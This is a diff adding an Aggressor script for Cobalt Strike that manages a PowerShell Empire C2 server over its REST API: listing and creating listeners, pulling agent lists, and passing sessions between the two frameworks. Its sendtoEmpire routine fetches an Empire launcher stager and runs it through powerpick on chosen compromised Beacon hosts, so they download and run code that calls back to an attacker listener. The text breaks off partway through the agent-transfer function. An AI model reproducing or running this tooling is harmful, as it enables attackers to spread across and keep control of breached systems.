@@ -1,0 +1,1173 @@
+#author bluscreenofjeff
+
+# Big thanks to @harmj0y and @armitagehacker
+# Heavily based upon @harmjoy's Veil-Evasion cortana script
+#	https://github.com/HarmJ0y/cortana/blob/master/veil_evasion/veil_evasion.cna
+
+#ToDo
+
+#empty beacon and empire agent selection
+#ability to enter creds to pull session token (after Empire 2.0)
+#test connection functionality in server config (after Empire 2.0)
+#ability to handle Windows and *NIX Beacons (after Empire 2.0)
+#add dll injection (or other covert method) Beacon -> Empire method
+#if no token/creds set, prompt for config setup
+#add optional alias parameter to provide Empire listener
+
+# needed imports for custom menu creation
+import java.awt.*; # for borderlayout
+import javax.swing.*; # for jpanel
+import javax.swing.table.*; #tablerowsorter
+import table.*; # generictablemodel
+import ui.*; #atable
+
+import java.awt.BorderLayout;
+import java.awt.EventQueue;
+
+import javax.swing.JFrame;
+import javax.swing.JPanel;
+import javax.swing.border.EmptyBorder;
+import java.awt.GridLayout;
+import javax.swing.JScrollPane;
+import javax.swing.JTextArea;
+import javax.swing.BoxLayout;
+import javax.swing.JList;
+import javax.swing.JButton;
+import javax.swing.SwingConstants;
+import java.awt.GridBagLayout;
+import java.awt.GridBagConstraints;
+import java.awt.Insets;
+import javax.swing.GroupLayout;
+import javax.swing.JLabel;
+import java.awt.FlowLayout;
+import javax.swing.JTable;
+
+
+#global default server settings
+%empireserverSettings["ip"] = "127.0.0.1";
+%empireserverSettings["port"] = "1337";
+%empireserverSettings["token"] = "EMPIRE REST TOKEN GOES HERE";
+
+# credential authentication coming after Empire 2.0 release
+# %empireserverSettings["username"] = "Optional if token provided";
+# %empireserverSettings["password"] = "Optional if token provided";
+
+%empireserverAttributes["listeners"] = @();
+%empireserverAttributes["agents"] = @();
+%empireserverAttributes["current_listener_options"] = @();
+%empireserverAttributes["targetbeacons"] = @();
+
+
+
+global('%empireserverSettings %empireserverAttributes $select_bool');
+
+$select_bool = "False";
+
+#Used to configure Empire server settings.
+sub configureServer {
+
+    local('$center $south $c $x $saveButton $cancelButton');
+    global('%empireserverSettings');
+
+    # main title and dimensions of the dialog box
+    $configure_server_dialog = dialog("Configure Empire Server Settings", 590, 205);
+
+    # if the server settings haven't been configured previously, throw some defaults in
+    if (!%empireserverSettings){
+        %empireserverSettings["ip"] = "127.0.0.1";
+        %empireserverSettings["port"] = "1337";
+        %empireserverSettings["token"] = "EMPIRE REST TOKEN GOES HERE";
+        %empireserverSettings["username"] = "Optional if token provided";
+        %empireserverSettings["password"] = "Optional if token provided";
+    }
+
+    # build out the option list table for the server settings
+    $model = [new GenericTableModel: @("Option", "Value"), "Option", 128];
+    [$model setCellEditable: 1];
+
+    [$model _addEntry: %(Option => "Empire IP", Value => %empireserverSettings["ip"], Tooltip => "Empire server's IP", Hide => '0')];
+    [$model _addEntry: %(Option => "Empire Port", Value => %empireserverSettings["port"], Tooltip => "Port Empire is listening on", Hide => '0')];
+    [$model _addEntry: %(Option => "Empire REST Token", Value => %empireserverSettings["token"], Tooltip => "Empire's REST token", Hide => '0')];
+	#credential auth coming after Empire 2.0
+	#[$model _addEntry: %(Option => "Empire Username", Value => %empireserverSettings["username"], Tooltip => "Username for Empire authentication", Hide => '0')];
+ 	#[$model _addEntry: %(Option => "Empire Password", Value => %empireserverSettings["password"], Tooltip => "Password for Empire authenticaation", Hide => '0')];
+    
+    $table = [new ATable: $model];
+
+    # set up the panes
+    $center = [new JScrollPane: $table];
+    $south = [new JPanel];
+    [$south setLayout: [new BoxLayout: $south, [BoxLayout Y_AXIS]]];
+
+    [$south setLayout: [new GridLayout: 1, 1]];
+
+    $c = [new JPanel];
+    [$c setLayout: [new FlowLayout: [FlowLayout CENTER]]];
+
+    # our buttons
+    # $testconnectionButton = [new JButton: "Test Server Connection"];
+    $saveButton = [new JButton: "Save"];
+    $cancelButton = [new JButton: "Cancel"];
+
+    # add a lambda listener to testconnection dialog
+    # [$testconnectionButton addActionListener: lambda({
+        
+    # 	testConnection();
+
+    #     [$configure_server_dialog setVisible: 0]; # close the dialog off
+    #     })];
+
+    # add a lambda listener to save the settings
+    [$saveButton addActionListener: lambda({
+        
+        syncTable($table);
+        $options = %();
+
+        # grab all the filled in option values from the table
+        for ($x = 0; $x < [$model getRowCount]; $x++) {
+            $options[ [$model getValueAt: $x, 0] ] = [$model getValueAt: $x, 1];
+        }
+
+        # save settings
+        %empireserverSettings["ip"] = $options["Empire IP"];
+        %empireserverSettings["port"] = $options["Empire Port"];
+        %empireserverSettings["token"] = $options["Empire REST Token"];
+        %empireserverSettings["username"] = $options["Empire Username"];
+        %empireserverSettings["password"] = $options["Empire Password"];
+
+        elog("\c9[+]\c7 Configured Cobalt Strike to connect to Empire at " . %empireserverSettings['ip'] . " on port " . %empireserverSettings['port'] . " using token \'" . %empireserverSettings['token'] . "\'");
+       
+        [$configure_server_dialog setVisible: 0]; # close the dialog off
+        })];
+
+    # add a lambda listener to close dialog without saving (cancel)
+    [$cancelButton addActionListener: lambda({
+        
+        [$configure_server_dialog setVisible: 0]; # close the dialog off
+        })];
+
+    # add the buttons to the frame
+    [$c add: $testconnectionButton];
+    [$c add: $saveButton];
+    [$c add: $cancelButton];
+
+    # add the southern frame that contains the action button
+    [$south add: $c];
+
+    local('$s');
+    $s = [new JSplitPane: [JSplitPane VERTICAL_SPLIT], $north, $center];
+    [$center setPreferredSize: [new Dimension: 0, 0]];
+    
+    [$s resetToPreferredSizes];
+    [$s setOneTouchExpandable: 1];
+
+    [$configure_server_dialog add: $s, [BorderLayout CENTER]];   
+    [$configure_server_dialog add: $south, [BorderLayout SOUTH]];
+
+    [$saveButton requestFocus];
+    [$configure_server_dialog setVisible: 1];
+
+}
+
+#FUNCTION COMING SOON
+# sub testConnection {
+# 	@command = @('curl', "--insecure", "-i", '-H', 'Content-Type: application/json', 'https://' . %empireserverSettings["ip"] . ":" . %empireserverSettings["port"] . "/api/admin/login", '-X POST', '-d', '{"username":"' . %empireserverAttributes['username'] . '","password":"' . %empireserverAttributes['password'] . '"}');
+# 	$curl_command = exec(@command);
+# 	@testconnection_results = readAll($curl_command);
+# 	closef($curl_command);
+# 	checkError(@create_listener_response);
+# 	printAll(@testconnection_results);
+# }
+
+sub configureListeners {
+	
+	#GUI taken from @harmj0y's veil_evasion.cna script:
+	#https://github.com/Veil-Framework/Veil-Evasion/blob/master/tools/cortana/veil_evasion.cna
+
+	#and Armitage source (see bottom of script)
+
+    local('$center $south $c $x $selectButton $refreshButton $createButton $removeButton $closeButton');
+
+    local('$selected_listener');
+
+    getListeners()   
+    
+    # main title and dimensions of the dialog box
+    if ($select_bool eq "True"){
+		$listener_dialog = dialog("Select Listener", 590, 280);
+    }
+    else {
+    	$listener_dialog = dialog("Configure Listeners", 590, 280);
+    }
+    
+
+
+    # build out the option list table
+    $model = [new GenericTableModel: @("Name", "Port", "Type", "Redirect Target"), "Option", 128];
+    [$model setCellEditable: 0];
+
+   	foreach $listener_iter (%empireserverAttributes["listeners"]) {
+   		[$model _addEntry: %(Name => $listener_iter["listener"], Port => $listener_iter["port"], Type => $listener_iter["type"], Redirect Target => $listener_iter["redirect_target"])];	
+   	}
+    
+    
+    $table = [new ATable: $model];
+
+    [[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];
+    $sorter = [new TableRowSorter: $model];
+    [$table setRowSorter: $sorter];
+
+    # set up the panes
+    $center = [new JScrollPane: $table];
+    $south = [new JPanel];
+    [$south setLayout: [new BoxLayout: $south, [BoxLayout Y_AXIS]]];
+
+    [$south setLayout: [new GridLayout: 1, 0]];
+
+    $c = [new JPanel];
+    [$c setLayout: [new FlowLayout: [FlowLayout CENTER]]];
+
+    # our buttons
+    $selectButton = [new JButton: "Select Listener"];
+    $refreshButton = [new JButton: "Refresh List"];
+    $createButton = [new JButton: "Create"];
+    $removeButton = [new JButton: "Remove"];
+    $closeButton = [new JButton: "Close Window"];
+
+    #selectButton listener
+    [$selectButton addActionListener: lambda({
+        $select_bool = "False";
+
+		syncTable($table);
+		$selected_listener = [$table getValueAt: [$table getSelectedRow], 0];
+		#HTML encode spaces to avoid errors when handling listener names with spaces
+		$selected_listener = strrep($selected_listener," ","%20");
+
+		if ($selected_listener eq ""){
+			show_message("Please select a listener");
+		}
+		
+		else {
+   			sendtoEmpire($selected_listener, %empireserverAttributes["targetbeacons"]);
+        	[$listener_dialog setVisible: 0]; # close the dialog off
+		}
+        
+        })];
+
+    #refreshButton listener
+    [$refreshButton addActionListener: lambda({
+        [$listener_dialog setVisible: 0]; # close the dialog off
+        configureListeners();
+        })];
+
+    #createButton listener
+    [$createButton addActionListener: lambda({
+        addListener();
+        })];
+
+    #removeButton listener
+    [$removeButton addActionListener: lambda({
+			syncTable($table);
+			$selected_listener = [$table getValueAt: [$table getSelectedRow], 0];
+	        if (($selected_listener ne "No Active Listeners") && ($selected_listener ne '')) {
+		        prompt_confirm("Are you sure you want to remove listener \'" . $selected_listener . "\'?", "Remove Listener Confirmation", {
+					removeListener($selected_listener);
+					$selected_listener = '';
+				});
+	    	}
+        })];
+
+    #closeButton listener
+    [$closeButton addActionListener: lambda({
+    	$select_bool = "False";
+        [$listener_dialog setVisible: 0]; # close the dialog off
+        })];
+
+    # add the buttons to the frame
+    if ($select_bool eq "True") {
+    	[$c add: $selectButton];	
+    }
+    [$c add: $refreshButton];
+    [$c add: $createButton];
+    [$c add: $removeButton];
+    [$c add: $closeButton];
+
+    # add the southern frame that contains the action buttons
+    [$south add: $c];
+
+    local('$s');
+    $s = [new JSplitPane: [JSplitPane VERTICAL_SPLIT], $north, $center];
+    [$center setPreferredSize: [new Dimension: 0, 0]];
+    
+    [$s resetToPreferredSizes];
+    [$s setOneTouchExpandable: 1];
+
+    [$listener_dialog add: $s, [BorderLayout CENTER]];   
+    [$listener_dialog add: $south, [BorderLayout SOUTH]];
+
+    [$refreshButton requestFocus];
+    [$listener_dialog setVisible: 1];
+}
+
+sub jsonValueExtract {
+	local('$temp');
+	$temp = replace($1,',','');
+	$temp = replace($temp,'"','');
+	if (charAt($temp, -1) eq ' '){
+		$temp = substr($temp, 0, int(strlen($temp)) - 1 );
+	}
+	return $temp;
+}
+
+sub getListeners {
+	#curl list of listeners from Empire
+		%empireserverAttributes["listeners"] = @();
+
+		local('$name_temp $port_temp $type_temp $redirect_temp $host_temp');
+
+		$curl_command = exec("curl --insecure -i https://" . %empireserverSettings["ip"] . ":" . %empireserverSettings["port"] . "/api/listeners?token=" . %empireserverSettings["token"]);
+		@listeners = readAll($curl_command);
+		closef($curl_command);
+
+		checkError(@listeners);
+
+		#parse listener names from output
+		foreach $key => $value (@listeners){
+			#Listener Name
+			if ('"name"' isin $value){
+				$name_temp = split(': ',$value)[1];
+				$name_temp = jsonValueExtract($name_temp);
+			}
+			#Host
+			if ('"host"' isin $value){
+				$host_temp = split(': ',$value)[1];
+				$host_temp = jsonValueExtract($host_temp);
+			}
+
+			#Port
+			if ('"port"' isin $value){
+				$port_temp = split(': ',$value)[1];
+				$port_temp = jsonValueExtract($port_temp);
+			}
+
+			#Type
+			if ('"listener_type"' isin $value){
+				$type_temp = split(': ',$value)[1];
+				$type_temp = jsonValueExtract($type_temp);
+			}
+
+			#Redirect Target
+			if ('"redirect_target"' isin $value){
+				$redirect_temp = split(': ',$value)[1];
+				$redirect_temp = jsonValueExtract($redirect_temp);
+			}
+
+			if (('}' isin $value) && ($name_temp ne $null)) {
+				add(%empireserverAttributes["listeners"], %(listener => "$name_temp", host => "$host_temp", port => "$port_temp", type => "$type_temp", redirect_target => "$redirect_temp"));
+				$name_temp = $null;
+			}
+		}
+		#throw error if no listener names found
+		if (strlen(%empireserverAttributes["listeners"]) <= 3){
+			add(%empireserverAttributes["listeners"], %(listener => "No Active Listeners", port => "", type => "", redirect_target => ""));
+		}
+}
+
+sub addListener {
+
+	#GUI taken from @harmj0y's veil_evasion.cna script:
+	#https://github.com/Veil-Framework/Veil-Evasion/blob/master/tools/cortana/veil_evasion.cna
+
+	#and Armitage source (see bottom of script)
+
+    local('$center $south $c $x $createButton $closeButton %newlistenersettings');
+
+    #current_listener_options declaration
+    local('$name_temp $description_temp $required_temp $value_temp $current_key $delta $error_mesg');
+    
+    # main title and dimensions of the dialog box
+    $addlistener_dialog = dialog("Add a Listener", 700, 400);
+
+
+    # build out the option list table
+    $model = [new GenericTableModel: @("Option", "Value", "Required", "Description"), "Option", 128];
+    [$model setCellEditable: 1];
+
+    #Get details from Empire
+    %empireserverAttributes["current_listener_options"] = @();
+    $curl_command = exec("curl --insecure -i https://" . %empireserverSettings["ip"] . ":" . %empireserverSettings["port"] . "/api/listeners/options?token=" . %empireserverSettings["token"]);
+	@current_listener_options = readAll($curl_command);
+	closef($curl_command);
+
+	checkError(@current_listener_options);
+	
+	$current_key = "$null";
+	foreach $key => $value (@current_listener_options){
+		#Listener Name Option
+
+		if ( ': {' isin $value) {
+			$current_key = split(': ',$value)[0];
+			$current_key = strrep($current_key," ","");
+			$current_key = jsonValueExtract($current_key);
+		}
+		if ('"Description"' isin $value) {
+			$description_temp = split(': ',$value)[1];
+			$description_temp = jsonValueExtract($description_temp);
+		}
+		if ('"Required"' isin $value) {
+			$required_temp = split(': ',$value)[1];
+			$required_temp = jsonValueExtract($required_temp);
+		}
+		if ('"Value"' isin $value) {
+			$value_temp = split(': ',$value)[1];
+			$value_temp = jsonValueExtract($value_temp);
+		}
+
+		if (('}' isin $value) && ($current_key ne $null)) {
+			add(%empireserverAttributes["current_listener_options"], %(option => "$current_key", description => "$description_temp", required => "$required_temp", value => "$value_temp"));
+			$current_key = $null;
+		}
+	}
+
+	foreach $current_listener_option (%empireserverAttributes["current_listener_options"]){
+ 		[$model _addEntry: %(Option => "$current_listener_option['option']", Value => "$current_listener_option['value']", Required => "$current_listener_option['required']", Description => "$current_listener_option['description']")];
+	}
+
+
+    $table = [new ATable: $model];
+
+    $sorter = [new TableRowSorter: $model];
+    [$table setRowSorter: $sorter];
+
+    # set up the panes
+    $center = [new JScrollPane: $table];
+    $south = [new JPanel];
+    [$south setLayout: [new BoxLayout: $south, [BoxLayout Y_AXIS]]];
+
+    [$south setLayout: [new GridLayout: 1, 0]];
+
+    $c = [new JPanel];
+    [$c setLayout: [new FlowLayout: [FlowLayout CENTER]]];
+
+    # our buttons
+    $createButton = [new JButton: "Create Listener"];
+    $closeButton = [new JButton: "Close Window"];
+
+    #createButton listener
+    [$createButton addActionListener: lambda({
+
+        syncTable($table);
+        $options = %();
+
+        # grab all the filled in option values from the table
+        for ($x = 0; $x < [$model getRowCount]; $x++) {
+            foreach $oldentry (%empireserverAttributes["current_listener_options"]){
+				if ($oldentry['option'] eq [$model getValueAt: $x, 0]) {
+					add($oldentry, NewValue => [$model getValueAt: $x, 1]);
+				}
+			}
+            
+        }
+
+        #find changed values, we will only send those to Empire with curl
+        #printAll(%empireserverAttributes["current_listener_options"]);
+        @delta = @();
+        foreach $entry (%empireserverAttributes["current_listener_options"]){
+        	if ($entry['NewValue'] ne $entry['value']) {
+        		add(@delta,"\" $+ $entry['option'] $+ \":\" $+ $entry['NewValue'] $+ \"");
+        	}
+        }
+
+        $delta_options = '{' . join(",",@delta) . '}';
+        
+
+        #create the listener with curl
+		@command = @('curl', "--insecure", "-i", '-H', 'Content-Type: application/json', 'https://' . %empireserverSettings["ip"] . ":" . %empireserverSettings["port"] . "/api/listeners?token=" . %empireserverSettings["token"], '-X POST', '-d', $delta_options);
+		$curl_command = exec(@command);
+		@create_listener_response = readAll($curl_command);
+		closef($curl_command);
+		checkError(@create_listener_response);
+		if ('"success": false' isin @create_listener_response) {
+			sub extractlistenererror {
+				if ('"msg": ' isin $1) {
+					$error_mesg = split(": ",$1,)[1];
+					$error_mesg = substr($error_mesg, 0, int(strlen($error_mesg)) - 2 );
+					show_error("The following error occurred:\n $error_mesg");
+				}
+			}
+			search(@create_listener_response, &extractlistenererror);
+		}
+		else {
+			[$addlistener_dialog setVisible: 0]; # close the dialog off
+			[$listener_dialog setVisible: 0]; # close the dialog off
+        	configureListeners();
+		}
+		clear(@create_listener_response);
+
+
+       })];
+
+    #closeButton listener
+    [$closeButton addActionListener: lambda({
+        [$addlistener_dialog setVisible: 0]; # close the dialog off
+        })];
+
+    [$c add: $createButton];
+    [$c add: $closeButton];
+
+    # add the southern frame that contains the action buttons
+    [$south add: $c];
+
+    local('$s');
+    $s = [new JSplitPane: [JSplitPane VERTICAL_SPLIT], $north, $center];
+    [$center setPreferredSize: [new Dimension: 0, 0]];
+    
+    [$s resetToPreferredSizes];
+    [$s setOneTouchExpandable: 1];
+
+    [$addlistener_dialog add: $s, [BorderLayout CENTER]];   
+    [$addlistener_dialog add: $south, [BorderLayout SOUTH]];
+
+    [$refreshButton requestFocus];
+    [$addlistener_dialog setVisible: 1];
+}
+
+#$1 = listener name
+sub removeListener {
+	local('$error_mesg $listener_name');
+	#HTML encode spaces to avoid errors when handling listener names with spaces
+	$listener_name = strrep($1," ","%20");
+	$curl_command = exec("curl --insecure -i https://" . %empireserverSettings["ip"] . ":" . %empireserverSettings["port"] . "/api/listeners/" . $listener_name ."?token=" . %empireserverSettings["token"] . " -X DELETE");
+	@kill_listener_response = readAll($curl_command);
+	closef($curl_command);
+
+	checkError(@kill_listener_response);
+
+	[$listener_dialog setVisible: 0]; # close the dialog off
+	configureListeners();
+}
+
+#$1 = listener name, $2 = target beacons
+sub sendtoEmpire {
+	
+	local('$error_mesg $listener_name');
+	#HTML encode spaces to avoid errors when handling listener names with spaces
+	$listener_name = strrep($1," ","%20");
+	
+	
+	#curl Empire for chosen listener's launcher
+
+	#Windows stager
+	$cmd = 'curl --insecure -i -H Content-Type:application/json https://' . %empireserverSettings["ip"] . ':' . %empireserverSettings["port"] . '/api/stagers?token=' . %empireserverSettings["token"] . ' -X POST -d {"StagerName":"launcher","Listener":"' . $listener_name . '","Base64":"True"} ';
+	println($cmd);
+	$curl_stager = exec($cmd);
+	@windows_stager = readAll($curl_stager);
+	closef($curl_stager);
+
+	checkError(@windows_stager);
+
+	#NIX stager
+	#COMING SOON
+	# $cmd = 'curl --insecure -i -H Content-Type:application/json https://' . %empireserverSettings["ip"] . ':' . %empireserverSettings["port"] . '/api/stagers?token=' . %empireserverSettings["token"] . ' -X POST -d {"StagerName":"launcher","Listener":"' . $listener_name . '"} ';
+	# $curl_stager = exec($cmd);
+	# @nix_stager = readAll($curl_stager);
+	# closef($curl_stager);
+
+	if ('200' isin @windows_stager[0]){
+		#parse stager command names from output - windows
+		foreach $key => $value (@windows_stager){
+			if ('"Output"' isin $value){
+				$launcher_code = split(': ',$value)[1];
+				$launcher_code = replace($launcher_code,',','');
+				$launcher_code = replace($launcher_code,'"','');
+			}
+		}
+
+		#issue launcher on all selected beacons
+		foreach $beacon ($2) {
+			if (-isbeacon $beacon) {
+				binput($beacon, "powerpick $launcher_code");
+				bpowerpick($beacon, "$launcher_code");
+			}
+			else if (-isssh $beacon) {
+				#NIX LAUNCHING HERE in the future
+			}	
+		}
+
+		#clear the arrays out
+		clear(@listeners);
+		clear(@listener_names);
+		clear(@windows_stager);
+		clear(@nix_stager);
+		clear($launcher_code);
+	}
+}
+
+#$1 = array containing Empire response
+sub checkError {
+	if ('200' !isin $1[0]){
+		foreach $error_line ($1){
+			$error_mesg = $error_mesg . $error_line . "\n";
+		}
+		show_error("An error occurred:\n" . $error_mesg);
+	}
+}
+
+#requires an array of the json output lines from Empire
+sub parseJSON {
+
+	#TEMP
+    $curl_command = exec("curl --insecure -i https://" . %empireserverSettings["ip"] . ":" . %empireserverSettings["port"] . "/api/listeners/options?token=" . %empireserverSettings["token"]);
+	@current_listener_options = readAll($curl_command);
+	closef($curl_command);
+
+	checkError(@current_listener_options);
+
+	%json_options = %();
+
+	#regex to match key
+	foreach $json_line (@current_listener_options) {
+		local('$i');
+		$i = 1;
+		if ($json_line hasmatch '\s*\".*\"\:\s\{') {
+			$key = strrep($json_line, " ", "", ":", "", "{", "", "\"", "");
+			$keylinenumber = $i;
+			$i = 1;
+			@value = @();
+			foreach $valueline (sublist(@current_listener_options, $keylinenumber)) {
+				if ("}," !isin $valueline) {
+					add(@value, $valueline);
+					$i++
+				}
+				else {
+					break;
+				}
+			}
+			
+		}
+		else {
+			$i++;
+		}
+	}
+}
+
+sub getAgents {
+	#curl list of listeners from Empire
+	%empireserverAttributes["agents"] = @();
+
+	local('$curl_command $name_temp $ip_temp $username_temp $machinename_temp $lastseen_temp $redirect_temp @agents');
+
+	$curl_command = exec("curl --insecure -i https://" . %empireserverSettings["ip"] . ":" . %empireserverSettings["port"] . "/api/agents?token=" . %empireserverSettings["token"]);
+	@agents = readAll($curl_command);
+	closef($curl_command);
+
+	checkError(@agents);
+
+	#parse listener names from output
+	foreach $key => $value (@agents){
+		#Agent Name
+		if ('"name"' isin $value){
+			$name_temp = split(': ',$value)[1];
+			$name_temp = jsonValueExtract($name_temp);
+		}
+
+		#Internal IP
+		if ('"internal_ip"' isin $value){
+			$ip_temp = split(': ',$value)[1];
+			$ip_temp = jsonValueExtract($ip_temp);
+		}
+
+		#Username
+		if ('"username"' isin $value){
+			$username_temp = split(': ',$value)[1];
+			$username_temp = jsonValueExtract($username_temp);
+		}
+
+		#Machine Name
+		if ('"hostname"' isin $value){
+			$machinename_temp = split(': ',$value)[1];
+			$machinename_temp = jsonValueExtract($machinename_temp);
+		}
+
+		#Last Seen
+		if ('"lastseen_time"' isin $value){
+			$lastseen_temp = split(': ',$value)[1];
+			$lastseen_temp = jsonValueExtract($lastseen_temp);
+		}
+
+		if (('}' isin $value) && ($name_temp ne $null)) {
+			add(%empireserverAttributes["agents"], %(name => "$name_temp", internal_ip => "$ip_temp", username => "$username_temp", machinename => "$machinename_temp", lastseen => "$lastseen_temp"));
+			$name_temp = $null;
+		}
+	}
+	#throw error if no listener names found
+	if (strlen(%empireserverAttributes["agents"]) <= 3){
+		add(%empireserverAttributes["agents"], %(name => "No Active Agents", internal_ip => "", username => "", machinename => "", lastseen => ""));
+	}
+}
+
+sub agentsMenu {
+
+    local('$center $south $dialog $c $x $selectButton $refreshButton $selectallButton $closeButton @selected_agents @selected_rows');
+    
+    local('$empireListener $cobalt_listener $foreignlistenerpresent $agent_id $foreignlistenername');
+
+	getAgents()
+
+    # main title and dimensions of the dialog box
+    $agentconfigure_dialog = dialog("Pull Empire Agents into Cobalt Strike", 750, 280);
+
+    # build out the option list table
+    $model = [new GenericTableModel: @("Name", "Internal IP", "Machine Name", "Username","Last Seen"), "Option", 128];
+    [$model setCellEditable: 0];
+
+   	foreach $agent_iter (%empireserverAttributes["agents"]) {
+   		[$model _addEntry: %(Name => $agent_iter["name"], Internal IP => $agent_iter["internal_ip"], Machine Name => $agent_iter["machinename"], Username => $agent_iter["username"], Last Seen => $agent_iter["lastseen"])];	
+   	}
+       
+    $table = [new ATable: $model];
+
+    [[$table getSelectionModel] setSelectionMode: [ListSelectionModel MULTIPLE_INTERVAL_SELECTION]];
+    $sorter = [new TableRowSorter: $model];
+    [$table setRowSorter: $sorter];
+
+
+    # set up the panes
+    $center = [new JScrollPane: $table];
+    $south = [new JPanel];
+    [$south setLayout: [new BoxLayout: $south, [BoxLayout Y_AXIS]]];
+
+    [$south setLayout: [new GridLayout: 1, 0]];
+
+    $c = [new JPanel];
+    [$c setLayout: [new FlowLayout: [FlowLayout CENTER]]];
+
+    # our buttons
+    $selectButton = [new JButton: "Select Agent(s)"];
+    $selectallButton = [new JButton: "Select ALL Agents"];
+    $refreshButton = [new JButton: "Refresh List"];
+    $closeButton = [new JButton: "Close Window"];
+
+    #selectButton listener
+    [$selectButton addActionListener: lambda({
+
+		syncTable($table);
+		@selected_rows = [$table getSelectedRows];
+		@selected_agents = @();
+		foreach $row (@selected_rows) {
+			add(@selected_agents,[$table getValueAt: $row, 0]);
+		}
+
+		if (size(@selected_agents) < 1){
+			show_message("Please select an agent");
+		}
+		
+		else {
+			transferAgents(@selected_agents);
+		}
+		})];
+
+	#selectallButton listener
+    [$selectallButton addActionListener: lambda({
+		transferAgents('all');
+		})];
+
+    #refreshButton listener
+    [$refreshButton addActionListener: lambda({
+        [$agentconfigure_dialog setVisible: 0]; # close the dialog off
+        agentsMenu();
+        })];
+
+
+
+    #closeButton listener
+    [$closeButton addActionListener: lambda({
+    	$select_bool = "False";
+        [$agentconfigure_dialog setVisible: 0]; # close the dialog off
+        })];
+
+    # add the buttons to the frame
+    [$c add: $selectButton];	
+    [$c add: $selectallButton];
+    [$c add: $refreshButton];
+    [$c add: $closeButton];
+
+    # add the southern frame that contains the action buttons
+    [$south add: $c];
+
+    local('$s');
+    $s = [new JSplitPane: [JSplitPane VERTICAL_SPLIT], $north, $center];
+    [$center setPreferredSize: [new Dimension: 0, 0]];
+    
+    [$s resetToPreferredSizes];
+    [$s setOneTouchExpandable: 1];
+
+    [$agentconfigure_dialog add: $s, [BorderLayout CENTER]];   
+    [$agentconfigure_dialog add: $south, [BorderLayout SOUTH]];
+
+    [$selectButton requestFocus];
+    [$agentconfigure_dialog setVisible: 1];
+}
+
+sub beaconsMenu {
+
+    local('$center $south $c $x $selectButton $refreshButton $selectallButton $closeButton @selected_beacons @selected_rows');
+    
+    local('$empireListener $beaconsmenu_dialog $cobalt_listener $foreignlistenerpresent $agent_id $foreignlistenername');
+
+    # main title and dimensions of the dialog box
+    $becaonsmenu_dialog = dialog("Send to Empire", 750, 280);
+
+    # build out the option list table
+    $model = [new GenericTableModel: @("PID", "Internal IP", "Machine Name", "Username","Last Seen","Beacon ID"), "Option", 128];
+    [$model setCellEditable: 0];
+
+   	foreach $beacon_iter (beacons()) {
+   		[$model _addEntry: %(PID => $beacon_iter["pid"], Internal IP => $beacon_iter["internal"], Machine Name => $beacon_iter["computer"], Username => $beacon_iter["user"], Last Seen => $beacon_iter["lastf"], Beacon ID => $beacon_iter["id"])];	
+   	}
+       
+    $table = [new ATable: $model];
+
+    [[$table getSelectionModel] setSelectionMode: [ListSelectionModel MULTIPLE_INTERVAL_SELECTION]];
+    $sorter = [new TableRowSorter: $model];
+    [$table setRowSorter: $sorter];
+
+
+    # set up the panes
+    $center = [new JScrollPane: $table];
+    $south = [new JPanel];
+    [$south setLayout: [new BoxLayout: $south, [BoxLayout Y_AXIS]]];
+
+    [$south setLayout: [new GridLayout: 1, 0]];
+
+    $c = [new JPanel];
+    [$c setLayout: [new FlowLayout: [FlowLayout CENTER]]];
+
+    # our buttons
+    $selectButton = [new JButton: "Select Beacon(s)"];
+    $selectallButton = [new JButton: "Select ALL Beacons"];
+    $refreshButton = [new JButton: "Refresh List"];
+    $closeButton = [new JButton: "Close Window"];
+
+    #selectButton listener
+    [$selectButton addActionListener: lambda({
+
+		syncTable($table);
+		@selected_rows = [$table getSelectedRows];
+		@selected_beacons = @();
+		foreach $row (@selected_rows) {
+			add(@selected_beacons,[$table getValueAt: $row, 5]);
+		}
+
+		if (size(@selected_beacons) < 1){
+			show_message("Please select a Beacon");
+		}
+		
+		else {
+			$select_bool = "True";
+			clear(%empireserverAttributes["targetbeacons"]);
+			foreach $beacon (@selected_beacons) {
+				add(%empireserverAttributes["targetbeacons"],$beacon);
+			}
+			configureListeners(%empireserverAttributes["targetbeacons"]);
+			
+			[$becaonsmenu_dialog setVisible: 0]; # close the dialog off
+		}
+		})];
+
+	#selectallButton listener
+    [$selectallButton addActionListener: lambda({
+    	if (size(@selected_beacons) < 1){
+			show_message("No Beacons present");
+		}
+		else {
+			$select_bool = "True";
+			clear(%empireserverAttributes["targetbeacons"]);
+			foreach $beacon (beacons()) {
+				add(%empireserverAttributes["targetbeacons"],$beacon['id']);
+			}
+			configureListeners(%empireserverAttributes["targetbeacons"]);
+			[$becaonsmenu_dialog setVisible: 0]; # close the dialog off
+		}
+		})];
+
+    #refreshButton listener
+    [$refreshButton addActionListener: lambda({
+        [$becaonsmenu_dialog setVisible: 0]; # close the dialog off
+        beaconsMenu();
+        })];
+
+    #closeButton listener
+    [$closeButton addActionListener: lambda({
+        [$becaonsmenu_dialog setVisible: 0]; # close the dialog off
+        })];
+
+    # add the buttons to the frame
+    [$c add: $selectButton];	
+    [$c add: $selectallButton];
+    [$c add: $refreshButton];
+    [$c add: $closeButton];
+
+    # add the southern frame that contains the action buttons
+    [$south add: $c];
+
+    local('$s');
+    $s = [new JSplitPane: [JSplitPane VERTICAL_SPLIT], $north, $center];
+    [$center setPreferredSize: [new Dimension: 0, 0]];
+    
+    [$s resetToPreferredSizes];
+    [$s setOneTouchExpandable: 1];
+
+    [$becaonsmenu_dialog add: $s, [BorderLayout CENTER]];   
+    [$becaonsmenu_dialog add: $south, [BorderLayout SOUTH]];
+
+    [$selectButton requestFocus];
+    [$becaonsmenu_dialog setVisible: 1];
+}
+
+#$1 array of agent names to send to
+sub transferAgents {
+	local('$selected_agents $foreignlistenername');
+	@selected_agents = $1;
+	openPayloadHelper(lambda({
+				$cobalt_listener = listener_info($1);
+				getListeners();
+				$foreignlistenerpresent = "False";
+				$foreignlistenername = 'Foreign_Beacon_' . strrep($cobalt_listener['name']," ","_");
+				foreach $empireListener (%empireserverAttributes['listeners']){
+					if (($empireListener['type'] eq 'meter') && (replace(strrep($empireListener['host'],"http://","","https://",""),":.*","") eq $cobalt_listener['host']) && ($empireListener['port'] eq $cobalt_listener['port'])) {
+						$foreignlistenerpresent = "True";
+						$foreignlistenername = $empireListener['name'];
+					}
+				}
+				if ($foreignlistenerpresent eq "False") {
+					#create the listener with curl
+					if ('https' isin $cobalt_listener['payload']) {
+						$options = '{"Name":"' . $foreignlistenername . '","Type":"meter","CertPath":"./data/empire.pem","Port":"' . $cobalt_listener['port'] . '","Host":"https://' . $cobalt_listener['host'] . ':' . $cobalt_listener['port'] . '"}';
+					}
+					else {
